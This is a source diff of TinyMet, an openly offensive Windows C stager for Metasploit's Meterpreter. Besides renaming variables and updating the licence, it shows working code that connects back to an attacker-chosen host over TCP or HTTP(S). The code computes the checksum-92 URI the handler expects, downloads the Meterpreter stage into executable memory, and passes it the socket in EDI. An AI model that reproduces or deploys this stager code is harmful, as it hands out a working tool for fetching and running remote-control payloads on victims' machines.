@@ -1,6 +1,6 @@
 ﻿//بسم الله الرحمن الرحيم
 /************************************************
-*					  [TinyMet]					*
+*				  [TinyMet v0.2]					*
 *		The Tiny Meterpreter Executable		*
 *************************************************
 - @SheriefEldeeb
@@ -9,32 +9,30 @@
 - Made in Egypt :)
 ************************************************/
 /*
-Copyright (c) 2014, Sherif Eldeeb "eldeeb.net"
+Copyright (c) 2015, Sherif Eldeeb "eldeeb.net"
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without
 modification, are permitted provided that the following conditions are met:
-
-1. Redistributions of source code must retain the above copyright notice, this
-list of conditions and the following disclaimer.
-2. Redistributions in binary form must reproduce the above copyright notice,
-this list of conditions and the following disclaimer in the documentation
-and/or other materials provided with the distribution.
+* Redistributions of source code must retain the above copyright
+notice, this list of conditions and the following disclaimer.
+* Redistributions in binary form must reproduce the above copyright
+notice, this list of conditions and the following disclaimer in the
+documentation and/or other materials provided with the distribution.
+* Neither the name of the <organization> nor the
+names of its contributors may be used to endorse or promote products
+derived from this software without specific prior written permission.
 
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
-ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
+DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
-
-The views and conclusions contained in the software and documentation are those
-of the authors and should not be interpreted as representing official policies,
-either expressed or implied, of the FreeBSD Project.
 */
 #include <WinSock2.h>
 #include <Wininet.h>
@@ -45,10 +43,10 @@ either expressed or implied, of the FreeBSD Project.
 #pragma comment(lib, "wininet.lib")
 
 // Globals ...
-unsigned long uIP;
-unsigned short sPORT;
+unsigned long hostip;
+unsigned short portnumber;
 unsigned char *buf;
-unsigned int bufSize;
+unsigned int bufsize;
 
 
 // Functions ...
@@ -70,7 +68,7 @@ void gen_random(char* s, const int len) { // ripped from http://stackoverflow.co
 	s[len] = 0;
 }
 
-int TextChecksum8(char* text)
+int text_checksum_8(char* text)
 {
 	UINT temp = 0;
 	for (UINT i = 0; i < strlen(text); i++)
@@ -104,12 +102,12 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 		err_exit("gethostbyname");
 	}
 
-	uIP = *(unsigned long*)hostName->h_addr_list[0];
-	sPORT = htons(atoi(port));
+	hostip = *(unsigned long*)hostName->h_addr_list[0];
+	portnumber = htons(atoi(port));
 
-	server.sin_addr.S_un.S_addr = uIP;
+	server.sin_addr.S_un.S_addr = hostip;
 	server.sin_family = AF_INET;
-	server.sin_port = sPORT;
+	server.sin_port = portnumber;
 
 	sckt = socket(AF_INET, SOCK_STREAM, NULL);
 
@@ -141,9 +139,9 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 	//////////////////////////////
 	// When reverse_tcp and bind_tcp are used, the multi/handler sends the size of the stage in the first 4 bytes before the stage itself
 	// So, we read first 4 bytes to use it for memory allocation calculations 
-	recv(buffer_socket, (char*)&bufSize, 4, 0); // read first 4 bytes = stage size
+	recv(buffer_socket, (char*)&bufsize, 4, 0); // read first 4 bytes = stage size
 	
-	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	buf = (unsigned char*)VirtualAlloc(buf, bufsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	
 	// Q: why did we allocate bufsize+5? what's those extra 5 bytes?
 	// A: the stage is a large shellcode "ReflectiveDll", and when the stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER IN _EDI_ register.
@@ -153,7 +151,7 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 	buf[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
 	memcpy(buf + 1, &buffer_socket, 4); // got it?
 
-	length = bufSize;
+	length = bufsize;
 	while (length != 0){
 		int received = 0;
 		received = recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0);
@@ -173,8 +171,8 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	//***************************************************************//
 
 	// Variables
-	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
-	char FullURL[6] = { 0 };	// FullURL is ("/" + URI)
+	char uri[5] = { 0 };			//4 chars ... it can be any length actually.
+	char fullurl[6] = { 0 };	// fullurl is ("/" + URI)
 	unsigned char* buffer = nullptr;
 	DWORD flags = 0;
 	int dwSecFlags = 0;
@@ -184,15 +182,15 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	srand(GetTickCount());
 	while (true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
 	{
-		gen_random(URI, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
-		checksum = TextChecksum8(URI);	//Get the 8-bit checksum of the random value
+		gen_random(uri, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
+		checksum = text_checksum_8(uri);	//Get the 8-bit checksum of the random value
 		if (checksum == 92)		//If the checksum == 92, it will be handled by the multi/handler correctly as a "INITM" and will send over the stage.
 		{
 			break; // We found a random string that checksums to 98
 		}
 	}
-	strcpy(FullURL, "/");
-	strcat(FullURL, URI);
+	strcpy(fullurl, "/");
+	strcat(fullurl, uri);
 
 	//	2) Decide about whether we're reverse_http or reverse_https, and set flags appropriately.
 	if (WithSSL) {
@@ -218,7 +216,7 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	}
 
 	// 3.3: HttpOpenRequest
-	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, NULL);
+	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", fullurl, NULL, NULL, NULL, flags, NULL);
 	if (hHTTPOpenRequest == NULL){
 		err_exit("HttpOpenRequest()");
 	}
@@ -240,21 +238,20 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 
 	// 3.7: InternetReadFile: keep reading till nothing is left.
 
-	BOOL bKeepReading = true;
-	DWORD dwBytesRead = -1;
-	DWORD dwBytesWritten = 0;
-	while (bKeepReading && dwBytesRead != 0)
+	BOOL keepreading = true;
+	DWORD bytesread = -1;
+	DWORD byteswritten = 0;
+	while (keepreading && bytesread != 0)
 	{
-		bKeepReading = InternetReadFile(hHTTPOpenRequest, (buffer + dwBytesWritten), 4096, &dwBytesRead);
-		dwBytesWritten += dwBytesRead;
+		keepreading = InternetReadFile(hHTTPOpenRequest, (buffer + byteswritten), 4096, &bytesread);
+		byteswritten += bytesread;
 	}
 
 	//	4) Return pointer to the populated buffer to caller function.
 	return buffer;
 }
 
-char* WcharToChar(wchar_t* orig){
-	size_t convertedChars = 0;
+char* wchar_to_char(wchar_t* orig){
 	size_t origsize = wcslen(orig) + 1;
 	const size_t newsize = origsize * 2;
 	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
@@ -262,20 +259,11 @@ char* WcharToChar(wchar_t* orig){
 	return nstring;
 }
 
-// not needed anymore ... kept for future reference :)
-//wchar_t* CharToWchar(char* orig){
-//	size_t newsize = strlen(orig) + 1;
-//	wchar_t * wcstring = (wchar_t*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
-//	mbstowcs(wcstring, orig, newsize);
-//	return wcstring;
-//}
-
-
 int main()
 {
-	LPWSTR *szArglist;
-	int nArgs;
-	char helpText[] = "TinyMet v0.1\nwww.tinymet.com\n\n"
+	LPWSTR *arglist;
+	int argsCount;
+	char helptext[] = "TinyMet v0.1\nwww.tinymet.com\n\n"
 		"Usage: tinymet.exe [transport] LHOST LPORT\n"
 		"Available transports are as follows:\n"
 		"    0: reverse_tcp\n"
@@ -284,27 +272,26 @@ int main()
 		"    3: bind_tcp\n"
 		"\nExample:\n"
 		"\"tinymet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";
-		//"\"tinymet.exe 3 0.0.0.0 4444\"\nwill bind_tcp port 4444 on all interfaces.\n";
 
-	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
+	arglist = CommandLineToArgvW(GetCommandLineW(), &argsCount);
 
 	// rudimentary error checking
-	if (NULL == szArglist) { // problem parsing?
+	if (NULL == arglist) { // problem parsing?
 		err_exit("CommandLineToArgvW & GetCommandLineW");
 	}
-	else if (nArgs == 2 && !wcscmp(szArglist[1], L"--help")){ // looking for help?
-		printf(helpText);
+	else if (argsCount == 2 && !wcscmp(arglist[1], L"--help")){ // looking for help?
+		printf(helptext);
 		exit(-1);
 	}
-	else if (nArgs != 4){ // less than 4 args?
-		printf(helpText);
+	else if (argsCount != 4){ // less than 4 args?
+		printf(helptext);
 		err_exit("Invalid arguments count, should be 4");
 	}
 
 	// convert wchar_t to mb
-	char* TRANSPORT = WcharToChar(szArglist[1]);
-	char* LHOST = WcharToChar(szArglist[2]);
-	char* LPORT = WcharToChar(szArglist[3]);
+	char* TRANSPORT = wchar_to_char(arglist[1]);
+	char* LHOST = wchar_to_char(arglist[2]);
+	char* LPORT = wchar_to_char(arglist[3]);
 
 	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);
 
@@ -323,7 +310,7 @@ int main()
 		buf = met_tcp(LHOST, LPORT, TRUE);
 		break;
 	default:
-		printf(helpText);
+		printf(helptext);
 		err_exit("Transport should be 0,1,2 or 3"); // transport is not valid
 	}
 
